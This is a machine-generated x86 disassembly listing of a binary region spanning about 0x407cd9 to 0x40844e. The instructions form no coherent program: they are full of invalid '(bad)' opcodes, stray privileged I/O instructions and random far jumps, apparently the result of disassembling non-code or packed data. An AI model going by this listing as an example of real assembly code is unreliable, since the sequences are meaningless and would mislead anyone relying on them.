  407cd9:	sbb    BYTE PTR [edx-0x335e318e],0x90
  407ce0:	mov    ds:0x47b33405,eax
  407ce5:	inc    edi
  407ce6:	push   edx
  407ce7:	outs   dx,BYTE PTR ds:[esi]
  407ce8:	pop    eax
  407ce9:	lock mov al,cl
  407cec:	shl    BYTE PTR [ebx+edi*4-0x53],cl
  407cf0:	xchg   BYTE PTR [edx-0x32],ah
  407cf3:	add    eax,0xb582ec96
  407cf8:	mov    ah,0x92
  407cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cfb:	cld    
  407cfc:	loopne 0x407d22
  407cfe:	sub    al,0xb7
  407d00:	lock ret 
  407d02:	cmp    dl,ah
  407d04:	mov    bl,BYTE PTR [esi+0x5189bea2]
  407d0a:	adc    cl,cl
  407d0c:	imul   esp,DWORD PTR [edi],0xfffffff9
  407d0f:	mov    ds:0x15b44768,al
  407d14:	sub    al,0xe0
  407d16:	adc    ah,BYTE PTR [eax-0x22]
  407d19:	das    
  407d1a:	adc    eax,0x51ed6313
  407d1f:	mov    esi,esi
  407d21:	dec    esp
  407d22:	fld    TBYTE PTR [edx]
  407d24:	(bad)  
  407d25:	adc    ecx,DWORD PTR [ecx+0xd]
  407d28:	and    BYTE PTR [eax],bl
  407d2a:	pop    ebx
  407d2b:	out    dx,eax
  407d2c:	jno    0x407cd3
  407d2e:	mov    ch,0xd8
  407d30:	lock pop eax
  407d32:	xchg   edx,eax
  407d33:	mov    ebx,DWORD PTR [edi]
  407d35:	fcomp  DWORD PTR [eax+0x6]
  407d38:	xchg   esi,eax
  407d39:	or     eax,0xee5f920d
  407d3e:	sub    eax,DWORD PTR [ebp+0x20]
  407d41:	xchg   ebp,eax
  407d42:	sub    esi,esi
  407d44:	sub    BYTE PTR [edx-0x6],ch
  407d47:	shl    DWORD PTR [esi-0x4f],0xac
  407d4b:	loop   0x407d43
  407d4d:	shl    ecx,1
  407d4f:	lea    esp,[edx-0x6b]
  407d52:	int3   
  407d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d54:	mov    eax,ds:0x438ecf69
  407d59:	lea    edx,[ecx-0x56]
  407d5c:	mov    esp,DWORD PTR [esi]
  407d5e:	or     bh,0xe0
  407d61:	adc    eax,0x7fb633d1
  407d66:	pop    esi
  407d67:	inc    esi
  407d68:	scas   al,BYTE PTR es:[edi]
  407d69:	cmp    ch,ah
  407d6b:	mov    eax,ds:0x882722d8
  407d70:	lock dec ebp
  407d72:	push   esp
  407d73:	rol    bh,1
  407d75:	shl    DWORD PTR [ecx],0x59
  407d78:	dec    ebp
  407d79:	jg     0x407d5c
  407d7b:	pop    ebx
  407d7c:	jmp    0x407dd9
  407d7e:	jg     0x407d78
  407d80:	inc    edx
  407d81:	outs   dx,BYTE PTR ds:[esi]
  407d82:	fidivr WORD PTR [eax]
  407d84:	imul   esp,DWORD PTR [edi],0xe005c610
  407d8a:	aam    0x1a
  407d8c:	lock iret 
  407d8e:	xor    al,0xb9
  407d90:	shl    DWORD PTR [esi+0x3df91c4],0x8
  407d97:	cli    
  407d98:	out    dx,al
  407d99:	hlt    
  407d9a:	cmc    
  407d9b:	cli    
  407d9c:	mov    al,0x6e
  407d9e:	xor    al,0xcd
  407da0:	in     al,0xbc
  407da2:	adc    edx,DWORD PTR [eax+0x1c]
  407da5:	or     dl,BYTE PTR ds:0x8eda49a5
  407dab:	dec    esi
  407dac:	pop    es
  407dad:	outs   dx,DWORD PTR ds:[esi]
  407dae:	and    edx,DWORD PTR [ebx+0x2e]
  407db1:	pop    ds
  407db2:	xchg   edx,eax
  407db3:	mov    esp,0xf14a310a
  407db8:	pop    esi
  407db9:	cmp    cl,bl
  407dbb:	shl    dl,1
  407dbd:	mov    WORD PTR [ebp+edx*1+0x3b1a83f4],es
  407dc4:	fisttp QWORD PTR [ebx+0x47f89868]
  407dca:	inc    edx
  407dcb:	jecxz  0x407e3b
  407dcd:	mov    dl,0x11
  407dcf:	or     eax,0xbb386e6
  407dd4:	xstore-rng (bad)
  407dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dd6:	(bad)  
  407dd7:	or     esp,esi
  407dd9:	icebp  
  407dda:	fiadd  DWORD PTR [edi+0x57]
  407ddd:	mov    WORD PTR [esi],ds
  407ddf:	jmp    0xe257:0xde29f74c
  407de6:	pop    esp
  407de7:	pop    ss
  407de8:	xchg   esi,eax
  407de9:	add    ch,ah
  407deb:	jmp    0xd0bea589
  407df0:	es ins BYTE PTR es:[edi],dx
  407df2:	cs jmp 0x407e19
  407df5:	call   0xc807:0x6eacdbf7
  407dfc:	pop    edi
  407dfd:	repnz retf 
  407dff:	inc    esp
  407e00:	xlat   BYTE PTR ds:[ebx]
  407e01:	push   ebx
  407e02:	test   eax,0x2246ad54
  407e07:	test   ecx,0xc9fa2906
  407e0d:	enter  0xef91,0xcf
  407e11:	mov    al,BYTE PTR ds:0xc0dba3e3
  407e17:	std    
  407e18:	jl     0x407e13
  407e1a:	mov    cl,BYTE PTR [esi-0x79eb9b2]
  407e20:	mov    al,BYTE PTR [eax+ecx*8-0x7e]
  407e24:	dec    eax
  407e25:	xchg   esi,eax
  407e26:	imul   eax,DWORD PTR [esp+ebp*4-0x63],0x6a
  407e2b:	iret   
  407e2c:	cmp    eax,0x119bf302
  407e31:	xlat   BYTE PTR ds:[ebx]
  407e32:	nop
  407e33:	mov    ch,0x2
  407e35:	out    dx,al
  407e36:	int    0xbd
  407e38:	and    dh,BYTE PTR [ebx+ebp*1-0x7d]
  407e3c:	lsl    edi,WORD PTR [esi+0x5643b11e]
  407e43:	test   al,0x15
  407e45:	jmp    0x2e7d:0x6c6dba97
  407e4c:	cld    
  407e4d:	xchg   esi,eax
  407e4e:	push   edi
  407e4f:	sub    BYTE PTR [edi-0x3d5dae83],ch
  407e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e56:	xchg   DWORD PTR [esi-0x12],edx
  407e59:	stc    
  407e5a:	pop    ebp
  407e5b:	stos   BYTE PTR es:[edi],al
  407e5c:	or     ch,BYTE PTR ds:0x29e7aa0b
  407e62:	and    eax,DWORD PTR [ebx]
  407e64:	mov    bh,dl
  407e66:	inc    esp
  407e67:	sbb    BYTE PTR [edx+0x3f],cl
  407e6a:	sbb    cl,dl
  407e6c:	fcomp  QWORD PTR [eax]
  407e6e:	cmp    DWORD PTR [eax],eax
  407e70:	iret   
  407e71:	pop    ecx
  407e72:	(bad)  
  407e73:	jns    0x407e42
  407e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e76:	pop    edi
  407e78:	pop    edx
  407e79:	pop    ecx
  407e7a:	sar    BYTE PTR [esi],cl
  407e7c:	push   0x48
  407e7e:	xchg   esp,eax
  407e7f:	jmp    0x407ed4
  407e81:	dec    esi
  407e82:	lds    esi,FWORD PTR [ebx+0x14]
  407e85:	pop    ebp
  407e86:	jmp    0x56fd9114
  407e8b:	pop    ebp
  407e8c:	jae    0x407e33
  407e8e:	push   0x5a42b3fa
  407e93:	mov    cl,0x92
  407e95:	xlat   BYTE PTR ds:[ebx]
  407e96:	xor    DWORD PTR [eax-0x73],edi
  407e99:	mov    eax,ds:0xd29a380d
  407e9e:	sbb    bl,bl
  407ea0:	ss pop esi
  407ea2:	sbb    DWORD PTR [esi-0x26],esi
  407ea5:	lds    ebx,FWORD PTR [esi]
  407ea7:	ja     0x407ef2
  407ea9:	test   BYTE PTR [ebx],bl
  407eab:	jnp    0x407f27
  407ead:	cdq    
  407eae:	push   ss
  407eaf:	xchg   ebx,eax
  407eb0:	or     ebx,DWORD PTR [ebp+0x40]
  407eb3:	inc    esi
  407eb4:	jb     0x407e55
  407eb6:	adc    BYTE PTR gs:[esi+0x77bdd56c],cl
  407ebd:	push   es
  407ebe:	mov    ebx,0x3b57f5ba
  407ec3:	scas   eax,DWORD PTR es:[edi]
  407ec4:	outs   dx,DWORD PTR ds:[esi]
  407ec5:	dec    ebx
  407ec6:	mov    dh,0x99
  407ec8:	pop    esi
  407ec9:	shl    bl,cl
  407ecb:	pop    ebp
  407ecc:	nop
  407ecd:	xlat   BYTE PTR ds:[ebx]
  407ece:	iret   
  407ecf:	sar    DWORD PTR [eax+eax*8+0x1d],0xd1
  407ed4:	inc    ebx
  407ed5:	jp     0x407eb9
  407ed7:	ins    BYTE PTR es:[edi],dx
  407ed8:	shl    DWORD PTR [edi],0x9f
  407edb:	out    dx,al
  407edc:	xor    al,0x2b
  407ede:	int3   
  407edf:	clc    
  407ee0:	jmp    0x883a:0x28f49cce
  407ee7:	jecxz  0x407e82
  407ee9:	int    0xa8
  407eeb:	(bad)
  407eee:	jle    0x407e94
  407ef0:	outs   dx,DWORD PTR ds:[esi]
  407ef1:	jle    0x407f4b
  407ef3:	sahf   
  407ef4:	mov    edx,0x11c6886b
  407ef9:	out    0x5f,al
  407efb:	cwde   
  407efc:	out    0x5f,eax
  407efe:	sbb    eax,DWORD PTR [esi-0x15]
  407f01:	popa   
  407f02:	rol    DWORD PTR [esi+ecx*1],0xa2
  407f06:	aad    0x93
  407f08:	sub    al,0xea
  407f0a:	test   DWORD PTR [ebx-0x732f55e8],edi
  407f10:	nop
  407f11:	mov    ah,0x80
  407f13:	stc    
  407f14:	shr    ecx,1
  407f16:	mov    ds:0xdf4cdce,eax
  407f1b:	sbb    dl,BYTE PTR [esi]
  407f1d:	iret   
  407f1e:	xchg   ebx,eax
  407f1f:	in     eax,0x1
  407f21:	stos   BYTE PTR es:[edi],al
  407f22:	out    0xed,al
  407f24:	ins    DWORD PTR es:[edi],dx
  407f25:	jnp    0x407f32
  407f27:	jo     0x407f78
  407f29:	sub    esp,DWORD PTR [edi+0x7e]
  407f2c:	add    BYTE PTR [edx+0x51],dh
  407f2f:	popa   
  407f30:	xchg   esi,eax
  407f31:	aad    0xc7
  407f33:	or     DWORD PTR [edi+0x5c03179c],esp
  407f39:	jp     0x407f4d
  407f3b:	dec    eax
  407f3c:	mov    dl,0x93
  407f3e:	bound  esp,QWORD PTR [ecx+eax*4]
  407f41:	adc    al,0xe9
  407f43:	in     eax,0x98
  407f45:	int    0xea
  407f47:	or     esp,ebx
  407f49:	scas   al,BYTE PTR es:[edi]
  407f4a:	popf   
  407f4b:	mov    bh,0xca
  407f4d:	clc    
  407f4e:	xor    esp,DWORD PTR [eax]
  407f50:	icebp  
  407f51:	mov    bh,0xc1
  407f53:	dec    esp
  407f54:	dec    eax
  407f55:	or     DWORD PTR [eax],ecx
  407f57:	mov    cl,BYTE PTR [esi+0x1f8abdc3]
  407f5d:	int3   
  407f5e:	mov    edx,0x77624e76
  407f63:	ret    0x3f2a
  407f66:	stos   BYTE PTR es:[edi],al
  407f67:	je     0x407f43
  407f69:	leave  
  407f6a:	out    0xaa,eax
  407f6c:	ror    bh,cl
  407f6e:	aad    0xc
  407f70:	retf   0xf257
  407f73:	mov    bh,0x8
  407f75:	push   ebp
  407f76:	call   0x8f0:0x61a006f7
  407f7d:	inc    ebx
  407f7e:	dec    BYTE PTR [edi+0x2f17dd70]
  407f84:	jbe    0x407f5d
  407f86:	loop   0x407fc2
  407f88:	dec    esi
  407f89:	pop    es
  407f8a:	ins    DWORD PTR es:[edi],dx
  407f8b:	retf   
  407f8c:	mov    ds,WORD PTR [eax+edx*4]
  407f8f:	adc    al,0xd5
  407f91:	stos   DWORD PTR es:[edi],eax
  407f92:	pushf  
  407f93:	adc    al,0x4d
  407f95:	xor    esp,DWORD PTR [edx-0x4f4716c]
  407f9b:	add    DWORD PTR [ebx-0x1e],ebp
  407f9e:	test   edx,edi
  407fa0:	daa    
  407fa1:	mov    ah,0xa3
  407fa3:	and    eax,0xd72901b8
  407fa8:	mov    dl,0x79
  407faa:	pushf  
  407fab:	rcr    ch,1
  407fad:	inc    ebx
  407fae:	stc    
  407faf:	xor    DWORD PTR [ebp-0x4],ebp
  407fb2:	xchg   BYTE PTR [edi-0x55],ch
  407fb5:	push   dx
  407fb7:	cmp    BYTE PTR [esi-0x4ab76f65],dh
  407fbd:	pushw  es
  407fbf:	push   ss
  407fc0:	(bad)  
  407fc1:	adc    ah,BYTE PTR [ebx+edi*4+0x74]
  407fc5:	cmp    BYTE PTR [esi+0x3b],ch
  407fc8:	and    DWORD PTR [eax-0x26],0x8f257c59
  407fcf:	xor    DWORD PTR [ebp-0x61bd889e],esi
  407fd5:	adc    edi,DWORD PTR [eax-0x3638295]
  407fdb:	pmuludq mm0,QWORD PTR [eax+ebp*2-0x4f]
  407fe0:	mov    ah,0x75
  407fe2:	aas    
  407fe3:	fsub   QWORD PTR [esp+edi*2-0x77]
  407fe7:	nop
  407fe8:	xchg   ebp,eax
  407fe9:	pop    esi
  407fea:	push   es
  407feb:	nop
  407fec:	xchg   ebp,eax
  407fed:	cwde   
  407fee:	add    DWORD PTR fs:[edx+0x28],0x4e
  407ff3:	dec    esp
  407ff4:	lods   eax,DWORD PTR ds:[esi]
  407ff5:	test   BYTE PTR [eax],0x92
  407ff8:	mov    esi,0x4c10e2ec
  407ffd:	push   edi
  407ffe:	in     eax,0xc
  408000:	out    0xfa,al
  408002:	out    dx,al
  408003:	xchg   ecx,eax
  408004:	in     eax,0x60
  408006:	mov    al,ds:0xd8a67713
  40800b:	cmp    al,0x83
  40800d:	xchg   esp,eax
  40800e:	scas   eax,DWORD PTR es:[edi]
  40800f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408010:	push   es
  408011:	sbb    dl,BYTE PTR [ebp+0x115c8fbe]
  408017:	cmp    DWORD PTR [eax],eax
  408019:	call   DWORD PTR [edx+ebx*8-0x40]
  40801d:	jecxz  0x407fbd
  40801f:	fistp  WORD PTR ds:0x2ea990d0
  408025:	mov    BYTE PTR [esi-0x9],ch
  408028:	shr    BYTE PTR [edx+0x3c00b501],cl
  40802e:	lods   eax,DWORD PTR ds:[esi]
  40802f:	mov    ds:0x4837799e,al
  408034:	loope  0x407fe0
  408036:	xlat   BYTE PTR ds:[ebx]
  408037:	mov    ds:0x4e3bdcc8,eax
  40803c:	dec    esi
  40803d:	xlat   BYTE PTR ds:[ebx]
  40803e:	pop    edx
  40803f:	leave  
  408040:	jne    0x407ff0
  408042:	push   edi
  408043:	cwde   
  408044:	(bad)  
  408045:	xchg   esi,eax
  408046:	and    esi,DWORD PTR [esi+edx*4+0x6eabf021]
  40804d:	and    edx,DWORD PTR [ebx]
  40804f:	inc    ecx
  408050:	stos   BYTE PTR es:[edi],al
  408051:	stos   BYTE PTR es:[edi],al
  408052:	(bad)  
  408053:	mov    eax,0x2d676adc
  408058:	in     al,dx
  408059:	ds retf 
  40805b:	jb     0x40804b
  40805d:	test   BYTE PTR [ecx],bh
  40805f:	int3   
  408060:	sbb    al,0xab
  408062:	(bad)  
  408063:	mov    ah,0xcc
  408065:	xor    al,0xc5
  408067:	call   0x8589:0xa445ecd
  40806e:	test   al,0x77
  408070:	ds out 0xc8,eax
  408073:	jmp    0xb12d:0x5e815752
  40807a:	(bad)  
  40807b:	aad    0x66
  40807d:	lods   al,BYTE PTR ds:[esi]
  40807e:	js     0x40806e
  408080:	and    eax,0x59402681
  408085:	xchg   edx,eax
  408086:	mov    ds:0xa7f09d0c,eax
  40808b:	sbb    eax,0x9f0394ad
  408090:	jmp    0x1131:0x28b1084f
  408097:	jb     0x4080e7
  408099:	ret    0x869d
  40809c:	enter  0x512e,0x4d
  4080a0:	xchg   esi,eax
  4080a1:	sti    
  4080a2:	xchg   ebp,eax
  4080a3:	dec    ebp
  4080a4:	lds    edx,FWORD PTR [eax]
  4080a6:	cdq    
  4080a7:	test   BYTE PTR [edi+edi*4+0x75],dl
  4080ab:	add    dl,BYTE PTR [edx+0x25]
  4080ae:	dec    esp
  4080af:	sbb    edi,DWORD PTR [edi-0x518b3d4e]
  4080b5:	cmc    
  4080b6:	lds    esp,FWORD PTR [ebp-0x27251c8f]
  4080bc:	js     0x4080ff
  4080be:	ins    BYTE PTR es:[edi],dx
  4080bf:	or     eax,DWORD PTR [ecx-0x779819b1]
  4080c5:	rol    ebp,cl
  4080c7:	dec    esi
  4080c8:	sbb    DWORD PTR [ecx],ebp
  4080ca:	dec    ebp
  4080cb:	das    
  4080cc:	or     al,0x40
  4080ce:	cmp    al,0xa0
  4080d0:	jnp    0x408065
  4080d2:	pop    edx
  4080d3:	or     ah,BYTE PTR [ebx+0x155b9667]
  4080d9:	inc    edx
  4080da:	sti    
  4080db:	mov    ah,0x7c
  4080dd:	inc    edi
  4080de:	push   edx
  4080df:	clc    
  4080e0:	mov    DWORD PTR [esi+ecx*4],edx
  4080e3:	loope  0x408140
  4080e5:	mov    DWORD PTR [edi-0x7c],edx
  4080e8:	loop   0x40809d
  4080ea:	push   ebx
  4080eb:	push   edi
  4080ec:	test   BYTE PTR [bx-0x32],cl
  4080f0:	mov    ebp,0xe1dc1c03
  4080f5:	or     DWORD PTR [esi],esp
  4080f7:	fs (bad) 
  4080f9:	sbb    ebx,DWORD PTR [edi-0x65]
  4080fc:	fisub  DWORD PTR [edx]
  4080fe:	mov    bh,0xf5
  408100:	fistp  QWORD PTR [ebx]
  408102:	add    ah,BYTE PTR [edi-0x7f52976e]
  408108:	call   0x8cfb:0xf8b9c0ba
  40810f:	pop    ebp
  408110:	push   eax
  408111:	pop    ss
  408112:	pop    ecx
  408113:	stc    
  408114:	add    ebx,ecx
  408116:	in     eax,0xaa
  408118:	jno    0x4080e5
  40811a:	inc    eax
  40811b:	ja     0x408132
  40811d:	cmp    al,BYTE PTR [esp+ecx*2+0x5fa646e3]
  408124:	rcl    DWORD PTR [eax-0x493ea722],1
  40812a:	mov    dh,0x7d
  40812c:	int3   
  40812d:	iret   
  40812e:	and    DWORD PTR [esi+ebp*1-0x31b1d1b1],ecx
  408135:	call   0xef8d:0x4a2b5788
  40813c:	sub    BYTE PTR [esi-0x27],cl
  40813f:	jo     0x40812b
  408141:	inc    ecx
  408142:	cdq    
  408143:	sub    ecx,esp
  408145:	adc    BYTE PTR [esi],dl
  408147:	enter  0xfff5,0x8e
  40814b:	pushf  
  40814c:	std    
  40814d:	jecxz  0x40813a
  40814f:	xor    DWORD PTR [edi-0x3b],edi
  408152:	mov    ebx,0xd6d6586d
  408157:	test   BYTE PTR [ecx],ch
  408159:	jo     0x4081cc
  40815b:	fild   QWORD PTR [ebp+esi*1+0x280dcfe]
  408162:	test   eax,0xec5451c5
  408167:	into   
  408168:	dec    eax
  408169:	mov    ebp,0xb7792083
  40816e:	rcr    cl,0x14
  408171:	cmp    dh,ah
  408173:	mov    ebp,ds
  408175:	ficomp WORD PTR [eax]
  408177:	xchg   edx,eax
  408178:	push   ebx
  408179:	stc    
  40817a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40817b:	jne    0x4081f3
  40817d:	xchg   esp,eax
  40817e:	inc    ecx
  40817f:	jg     0x40819d
  408181:	je     0x408194
  408183:	jb     0x408157
  408185:	jmp    0x441ff988
  40818a:	push   es
  40818b:	sub    DWORD PTR [edi+0x68],edx
  40818e:	cs sbb esi,eax
  408191:	sbb    bh,ah
  408193:	call   0xf1e8c3e2
  408198:	mov    esi,0x5d6241c0
  40819d:	pop    ebp
  40819e:	stos   BYTE PTR es:[edi],al
  40819f:	call   0x320e:0xc1dd860a
  4081a6:	cld    
  4081a7:	retf   
  4081a8:	sti    
  4081a9:	pop    ecx
  4081aa:	icebp  
  4081ab:	xchg   edi,eax
  4081ac:	clc    
  4081ad:	sbb    DWORD PTR [ebx],ebx
  4081af:	pop    ebp
  4081b0:	shr    bh,0x2d
  4081b3:	jmp    0xdf34:0x2c298712
  4081ba:	or     al,0xc6
  4081bc:	bound  ebx,QWORD PTR [eax+ecx*2]
  4081bf:	scas   eax,DWORD PTR es:[edi]
  4081c0:	pop    ebx
  4081c1:	jp     0x4081d1
  4081c3:	cmp    esi,DWORD PTR [ebx+0x5e]
  4081c6:	push   esp
  4081c7:	add    BYTE PTR [ebx+0x62b90e48],0x50
  4081ce:	or     eax,0x5f56a9c1
  4081d3:	int3   
  4081d4:	xchg   DWORD PTR [ebp+0x59],edx
  4081d7:	xor    al,0x39
  4081d9:	inc    eax
  4081da:	jns    0x408250
  4081dc:	cdq    
  4081dd:	cmp    dl,BYTE PTR ds:0x9a170c98
  4081e3:	mov    dl,0x9f
  4081e5:	inc    edi
  4081e6:	dec    edx
  4081e7:	push   0x16d9dd08
  4081ec:	in     eax,0x43
  4081ee:	push   es
  4081ef:	inc    ebx
  4081f0:	mov    ah,0xf9
  4081f2:	ja     0x408236
  4081f4:	lods   al,BYTE PTR ds:[esi]
  4081f5:	fistp  QWORD PTR ds:0x4950c6a4
  4081fb:	xor    al,0x8f
  4081fd:	sub    ah,BYTE PTR [edi]
  4081ff:	mov    ecx,0x986d2910
  408204:	imul   edx,DWORD PTR [edi+0x21f135dd],0xffffffce
  40820b:	js     0x408210
  40820d:	mov    dh,0xbd
  40820f:	daa    
  408210:	xor    al,0xce
  408212:	cmc    
  408213:	adc    BYTE PTR [ebp-0x52],dl
  408216:	mov    bl,0xad
  408218:	data16 shl BYTE PTR [ebx+0x6b0e1c68],cl
  40821f:	mov    edx,0xd2be82e2
  408224:	jno    0x4081c0
  408226:	jg     0x408219
  408228:	dec    ebx
  408229:	fistp  WORD PTR [ebp+ecx*8+0x4800a765]
  408230:	cmp    al,0x9
  408232:	dec    esi
  408233:	inc    BYTE PTR [eax-0x3adfa0b8]
  408239:	das    
  40823a:	pop    esp
  40823b:	cmp    al,0x5e
  40823d:	push   ecx
  40823e:	sub    dh,cl
  408240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408241:	sahf   
  408242:	push   esi
  408243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408244:	xchg   ebp,eax
  408245:	ins    DWORD PTR es:[edi],dx
  408246:	imul   ebx,DWORD PTR [esi-0x507d3cbf],0xc02d926e
  408250:	or     BYTE PTR [ecx],dh
  408252:	xor    BYTE PTR [ebx],bh
  408254:	mov    eax,ds:0xf9b262df
  408259:	mov    bl,0x73
  40825b:	push   ebp
  40825c:	sub    DWORD PTR [eax],ebp
  40825e:	fsubr  DWORD PTR [ebp+0x9]
  408261:	leave  
  408262:	push   0xc907c3a2
  408267:	jno    0x4081f6
  408269:	mov    ch,0xab
  40826b:	inc    eax
  40826c:	inc    edx
  40826d:	or     bl,dh
  40826f:	fcom   st(0)
  408271:	mov    esi,DWORD PTR [esi+0x2d]
  408274:	arpl   WORD PTR [esi+0xaf0e5a0],dx
  40827a:	sbb    eax,0xf1f3f8f7
  40827f:	sub    al,0x5d
  408281:	jmp    DWORD PTR fs:[edi+esi*2-0x2b]
  408286:	adc    dh,ah
  408288:	data16 sahf 
  40828a:	cmp    BYTE PTR [ecx-0x162fa836],bh
  408290:	xor    al,0x73
  408292:	out    0xf3,al
  408294:	fld    st(6)
  408296:	fdivr  DWORD PTR [ebp-0x60]
  408299:	push   cs
  40829a:	mov    esp,0xda68c001
  40829f:	jnp    0x408249
  4082a1:	adc    eax,ecx
  4082a3:	cli    
  4082a4:	pusha  
  4082a5:	retf   0xa6a2
  4082a8:	inc    ecx
  4082a9:	lock fidivr WORD PTR [ecx+0x71c3f7f9]
  4082b0:	mov    bh,0xb
  4082b2:	neg    DWORD PTR [ebp-0x404b3383]
  4082b8:	or     eax,0xf408053f
  4082bd:	(bad)  [eax+0x4bf2256c]
  4082c3:	push   ecx
  4082c4:	inc    edx
  4082c5:	cmp    BYTE PTR [ecx+esi*1],al
  4082c8:	mov    al,0xf2
  4082ca:	and    al,0x9b
  4082cc:	add    al,0x5f
  4082ce:	int    0x1a
  4082d0:	inc    ecx
  4082d1:	loopne 0x4082dd
  4082d3:	cmp    DWORD PTR [eax],edi
  4082d5:	jnp    0x40827f
  4082d7:	les    esp,FWORD PTR [ebx]
  4082d9:	shl    DWORD PTR [eax-0x783811f9],1
  4082df:	mov    al,0xfa
  4082e1:	add    eax,esp
  4082e3:	cmp    cl,BYTE PTR [esi+0x72608609]
  4082e9:	and    bh,ch
  4082eb:	imul   edi,DWORD PTR [esi+0x63],0xf43b13e
  4082f2:	popf   
  4082f3:	stos   DWORD PTR es:[edi],eax
  4082f4:	outs   dx,BYTE PTR ds:[esi]
  4082f5:	(bad)  
  4082f6:	cmp    DWORD PTR [ebp-0x41],ebp
  4082f9:	mov    ds:0xea165cbf,eax
  4082fe:	pop    ebx
  4082ff:	aad    0xea
  408301:	jno    0x40830a
  408303:	cmp    DWORD PTR [esi],ecx
  408305:	mov    WORD PTR [ecx+0x47],?
  408308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408309:	push   edx
  40830a:	jbe    0x408383
  40830c:	push   ss
  40830d:	fidiv  WORD PTR [eax]
  40830f:	mov    ebp,0x1c4ea142
  408314:	or     al,0xe
  408316:	push   ss
  408317:	in     al,dx
  408318:	mov    cl,0xc8
  40831a:	lea    eax,[edi]
  40831c:	xchg   edi,eax
  40831d:	dec    ebx
  40831e:	inc    ebx
  40831f:	mov    ds:0x1f512d25,eax
  408324:	enter  0xa06b,0x9b
  408328:	pushf  
  408329:	inc    ebx
  40832a:	aaa    
  40832b:	mov    eax,ds:0x9ea71808
  408330:	xchg   ecx,eax
  408331:	pop    ecx
  408332:	sbb    esp,edx
  408334:	pusha  
  408335:	and    eax,0xb69df75f
  40833a:	add    DWORD PTR [ebp+0x75],esp
  40833d:	lods   eax,DWORD PTR ds:[esi]
  40833e:	ja     0x408370
  408340:	pop    DWORD PTR [eax]
  408342:	jne    0x408393
  408344:	cmp    esi,DWORD PTR [ecx+0x71]
  408347:	mov    ch,0xb3
  408349:	cld    
  40834a:	pop    ecx
  40834b:	shr    DWORD PTR [esp+esi*4],0x3
  40834f:	inc    ebx
  408350:	out    dx,eax
  408351:	cwde   
  408352:	or     BYTE PTR [edi+0x19],bh
  408355:	and    DWORD PTR [ebx+0x61],edi
  408358:	fcom   QWORD PTR [ebp-0x7c35e8bb]
  40835e:	mov    cl,0x24
  408360:	out    dx,eax
  408361:	je     0x408347
  408363:	mov    eax,ds:0x2949b660
  408368:	stc    
  408369:	scas   al,BYTE PTR es:[edi]
  40836a:	imul   eax,ebx,0x3a
  40836d:	repnz xor DWORD PTR [ecx],edx
  408370:	xchg   edi,eax
  408371:	jl     0x408331
  408373:	stc    
  408374:	icebp  
  408375:	gs sets cl
  408379:	mov    ds:0xe6e044bc,eax
  40837e:	inc    ebp
  40837f:	and    cl,BYTE PTR [ecx]
  408381:	shl    DWORD PTR [esi-0x63],0xe3
  408385:	xchg   ecx,eax
  408386:	cmc    
  408387:	loopne 0x408309
  408389:	lock xchg ebx,eax
  40838b:	sub    ch,0x69
  40838e:	dec    ebp
  40838f:	add    eax,0x2dc555f7
  408394:	sbb    ch,BYTE PTR [eax+edi*4-0x2d26ff7e]
  40839b:	out    0x4d,al
  40839d:	mov    ch,0xb7
  40839f:	xor    eax,0xafb7287e
  4083a4:	in     eax,dx
  4083a5:	ret    
  4083a6:	xor    ch,bl
  4083a8:	out    0x8a,eax
  4083aa:	gs inc edi
  4083ac:	push   ebp
  4083ad:	pop    ss
  4083ae:	cdq    
  4083af:	sbb    al,dh
  4083b1:	cmp    BYTE PTR [edx+0x2d],0x94
  4083b5:	lock jbe 0x40836a
  4083b8:	xor    edx,DWORD PTR [si+0x79]
  4083bc:	xchg   BYTE PTR [eax+0x70],bl
  4083bf:	jle    0x408436
  4083c1:	and    DWORD PTR [eax],ecx
  4083c3:	jp     0x4083bc
  4083c5:	in     al,dx
  4083c6:	div    DWORD PTR [eax+eax*4-0x63]
  4083ca:	test   ebp,edx
  4083cc:	sub    dl,BYTE PTR [edx]
  4083ce:	sahf   
  4083cf:	not    BYTE PTR [ecx-0x77]
  4083d2:	adc    eax,0x692bc736
  4083d7:	push   edx
  4083d8:	popf   
  4083d9:	inc    ebp
  4083da:	dec    ebp
  4083db:	jecxz  0x40837a
  4083dd:	ins    DWORD PTR es:[edi],dx
  4083de:	out    dx,eax
  4083df:	test   eax,0x8fe6643a
  4083e4:	mov    ds:0x1b6be651,al
  4083e9:	mov    esp,0x48f4d74e
  4083ee:	inc    edx
  4083ef:	xchg   esi,eax
  4083f0:	inc    esp
  4083f1:	ficomp WORD PTR [ebx+0x661f5ebd]
  4083f7:	loope  0x40844a
  4083f9:	ret    0xa456
  4083fc:	adc    al,0x6e
  4083fe:	pop    esp
  4083ff:	ins    DWORD PTR es:[edi],dx
  408400:	ds mov ch,0xdf
  408403:	xchg   edx,eax
  408404:	lods   eax,DWORD PTR ds:[esi]
  408405:	addr16 mov bl,0x29
  408408:	mov    bh,0x35
  40840a:	xor    esp,DWORD PTR [esi+ebx*4-0x5b]
  40840e:	push   ss
  40840f:	(bad)  [ecx+0x78]
  408412:	adc    eax,0x6c7d0dbe
  408417:	lods   eax,DWORD PTR ds:[esi]
  408418:	cli    
  408419:	bound  edx,QWORD PTR [esi-0x24]
  40841c:	out    0x89,eax
  40841e:	cmp    edx,ebx
  408420:	rcl    BYTE PTR [eax+edi*8+0x79],0xf2
  408425:	rcl    DWORD PTR [ebx+0x2b],1
  408428:	sbb    al,0x52
  40842a:	and    eax,0xef67486a
  40842f:	or     al,0x73
  408431:	into   
  408432:	(bad)  
  408433:	in     eax,dx
  408434:	and    al,0x28
  408436:	add    esi,eax
  408438:	and    dl,bh
  40843a:	mov    ?,WORD PTR [eax+ebx*2]
  40843d:	hlt    
  40843e:	mov    esi,esi
  408440:	mov    esi,DWORD PTR [edx+ebx*1+0x2d]
  408444:	mov    ecx,0x6c8cf61c
  408449:	ret    
  40844a:	data16 sub cl,BYTE PTR [ebx]
  40844d:	push   es
  40844e:	add    DWORD PTR [ecx+ebp*8+0x27],eax
